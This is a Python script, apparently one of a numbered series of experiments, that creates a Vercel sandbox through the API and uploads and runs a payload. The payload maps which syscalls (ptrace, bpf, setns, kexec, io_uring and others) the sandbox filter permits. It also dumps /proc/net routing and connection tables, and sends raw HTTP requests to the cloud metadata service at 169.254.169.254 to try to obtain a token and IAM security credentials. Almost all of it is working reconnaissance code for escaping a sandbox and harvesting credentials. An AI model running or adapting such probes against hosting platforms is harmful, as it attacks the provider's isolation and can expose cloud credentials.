# -*- coding: utf-8 -*-
"""实验J287m: fork隔离枚举S271-S449 + IMDS PUT/POST + /proc/net补漏"""
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("EXIT:", json.dumps(d.get("command", {}))[:300], flush=True)
        except Exception:
            print("NONJSON:", line[:400], flush=True)
    return out

def upload_file(sid, remote_path, data_bytes):
    b64 = base64.b64encode(data_bytes).decode()
    CHUNK = 3500
    for i in range(0, len(b64), CHUNK):
        part = b64[i:i + CHUNK]
        mode = "wb" if i == 0 else "ab"
        code = "import base64;open(%r,%r).write(base64.b64decode(%r))" % (remote_path, mode, part)
        r = run_cmd(sid, code, "UPLOAD_%d" % (i // CHUNK), timeout=100)
        if r == "DEAD":
            return False
    return True

NAME = "expj287m"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

PAYLOAD = r'''
import ctypes, os, socket, subprocess
libc = ctypes.CDLL(None, use_errno=True)

NAMES = {271:"ppoll",272:"unshare",273:"set_robust_list",274:"get_robust_list",
275:"splice",276:"tee",277:"sync_file_range",278:"vmsplice",279:"move_pages",
280:"utimensat",281:"epoll_pwait",282:"signalfd",283:"timerfd_create",
284:"eventfd",285:"fallocate",286:"timerfd_settime",287:"timerfd_gettime",
288:"accept4",289:"signalfd4",290:"eventfd2",291:"epoll_create1",292:"dup3",
293:"pipe2",294:"inotify_init1",295:"preadv",296:"pwritev",
297:"rt_tgsigqueueinfo",298:"perf_event_open",299:"recvmmsg",300:"fanotify_init",
301:"fanotify_mark",302:"prlimit64",303:"name_to_handle_at",
304:"open_by_handle_at",305:"clock_adjtime",306:"syncfs",307:"sendmmsg",
308:"setns",309:"getcpu",310:"process_vm_readv",311:"process_vm_writev",
312:"kcmp",313:"finit_module",314:"sched_setattr",315:"sched_getattr",
316:"renameat2",317:"seccomp",318:"getrandom",319:"memfd_create",
320:"kexec_file_load",321:"bpf",322:"execveat",323:"userfaultfd",
324:"membarrier",325:"mlock2",326:"copy_file_range",327:"preadv2",
328:"pwritev2",329:"pkey_mprotect",330:"pkey_alloc",331:"pkey_free",
332:"statx",333:"io_pgetevents",334:"rseq",424:"pidfd_send_signal",
425:"io_uring_setup",426:"io_uring_enter",427:"io_uring_register",
428:"open_tree",429:"move_mount",430:"fsopen",431:"fsconfig",432:"fsmount",
433:"fspick",434:"pidfd_open",436:"close_range",437:"openat2",
438:"pidfd_getfd",439:"faccessat2",440:"process_madvise",441:"epoll_pwait2",
442:"mount_setattr",443:"quotactl_fd",444:"landlock_create_ruleset",
445:"landlock_add_rule",446:"landlock_restrict_self",447:"memfd_secret",
448:"process_mrelease",449:"futex_waitv",
101:"ptrace",
}

print("=== PHASE1 fork-isolated enum S271+ ===", flush=True)
for n in sorted(NAMES):
    pid = os.fork()
    if pid == 0:
        # 子进程: 探测后退出; 若被 kill, waitpid 可见信号
        try:
            libc.syscall(n, 0, 0, 0, 0, 0, 0)
            e = ctypes.get_errno()
            os._exit(e & 0xff)
        except Exception:
            os._exit(99)
    _, st = os.waitpid(pid, 0)
    sig = st & 0x7f
    code = (st >> 8) & 0xff
    if sig:
        print("S%d:%s KILLED sig=%d" % (n, NAMES[n], sig), flush=True)
    else:
        print("S%d:%s e=%d" % (n, NAMES[n], code), flush=True)
print("=== PHASE1 DONE ===", flush=True)

def sh(cmd, t=6):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace")
    except Exception as e:
        return "ERR %s" % e

print("=== PHASE2 /proc/net 补漏 ===", flush=True)
print("--- tcp6 ---", flush=True)
print(sh("cat /proc/net/tcp6 | head -30"), flush=True)
print("--- udp ---", flush=True)
print(sh("cat /proc/net/udp | head -30"), flush=True)
print("--- udp6 ---", flush=True)
print(sh("cat /proc/net/udp6 | head -30"), flush=True)
print("--- fib_trie ---", flush=True)
print(sh("cat /proc/net/fib_trie | head -60"), flush=True)
print("--- neigh ---", flush=True)
print(sh("cat /proc/net/neigh | head -20"), flush=True)
print("--- nf_conntrack ---", flush=True)
print(sh("cat /proc/net/nf_conntrack 2>&1 | head -10"), flush=True)
print("=== PHASE2 DONE ===", flush=True)

def tcp_probe(host, port, payload, timeout=4):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(payload)
        try:
            d = s.recv(4096)
            return "SEND_OK RECV %dB: %r" % (len(d), d[:120])
        except Exception as e:
            return "SEND_OK RECV_ERR %s" % type(e).__name__
    except Exception as e:
        return "CONN_ERR %s" % type(e).__name__
    finally:
        s.close()

print("=== PHASE3 IMDS ===", flush=True)
tests = [
    ("PUT token", b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\n\r\n"),
    ("POST token", b"POST /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\n\r\n"),
    ("GET root", b"GET / HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n"),
    ("GET creds", b"GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n"),
]
for name, payload in tests:
    print("IMDS %s: %s" % (name, tcp_probe("169.254.169.254", 80, payload)), flush=True)
print("=== PHASE3 DONE ===", flush=True)
print("ALLDONE", flush=True)
'''

ok = upload_file(sid, "/tmp/rec3.py", PAYLOAD.encode())
print("upload:", ok, flush=True)

out = run_cmd(sid, "exec(open('/tmp/rec3.py').read())", "EXEC", timeout=280)
print("EXEC out len:", len(out or ""), flush=True)
print((out or "")[:12000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
